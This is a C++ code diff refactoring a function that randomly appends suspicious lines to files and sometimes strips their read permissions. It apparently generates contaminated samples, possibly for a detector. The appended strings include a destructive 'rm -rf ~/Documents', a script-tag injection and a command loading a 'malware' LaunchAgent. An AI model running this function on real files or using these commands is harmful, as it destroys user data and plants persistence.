@@ -3,31 +3,40 @@
 #include <fstream>
 #include <filesystem>
 
+const std::string jsSus = "<script>evil_script()</script>";
+const std::string unixSus = "rm -rf ~/Documents";
+const std::string macOSSus = "system(\"launchctl load /Library/LaunchAgents/com.malware.agent\")";
+
 size_t contaminateFile(const std::string& path)
 {
     std::ofstream fout(path, std::ios::app | std::ios::out);
 
     if(path.find(".js") != std::string::npos && rand() % 2 == 0)
     {
-        fout << "<script>evil_script()</script>" << std::endl;
+        fout << jsSus << std::endl;
         return 1;
     }
     else
     {
         if(rand() % 3 == 0)
         {
-            fout << "rm -rf ~/Documents" << std::endl;
+            fout << unixSus << std::endl;
             return 2;
         }
         else if(rand() % 5 == 0)
         {
-            fout << "system(\"launchctl load /Library/LaunchAgents/com.malware.agent\")" << std::endl;
+            fout << macOSSus << std::endl;
             return 3;
         }
         else if(rand() % 20 == 0)
         {
             fout.close();
-            std::filesystem::permissions(path, std::filesystem::perms::all, std::filesystem::perm_options::remove);
+
+            std::filesystem::permissions(
+                path,
+                std::filesystem::perms::group_read | std::filesystem::perms::owner_read  | std::filesystem::perms::others_read,
+                std::filesystem::perm_options::remove);
+
             return 4;
         }
     }
